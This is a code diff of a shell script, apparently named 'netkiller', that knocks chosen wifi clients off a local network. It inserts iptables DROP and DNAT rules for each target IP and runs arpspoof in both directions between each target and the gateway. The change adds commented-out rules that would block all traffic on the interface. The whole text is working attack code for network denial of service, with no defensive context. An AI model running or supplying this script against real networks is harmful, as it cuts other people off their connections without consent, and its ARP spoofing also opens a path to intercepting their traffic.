@@ -29,11 +29,16 @@ EOF
 chmod 755 /bin/netkiller-stop
 
 for TARGET in $TARGET_IPS; do
+   
     # Block all traffic of the target wifi clients
     iptables -I FORWARD -s "$TARGET" -j DROP
     iptables -I FORWARD -d "$TARGET" -j DROP
     iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-  
+   
+    # Uncomment to Block all the traffic
+    # iptables -I FORWARD -i "$INTERFACE" -j DROP
+    # iptables -I FORWARD -o "$INTERFACE" -j DROP
+    
     (
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
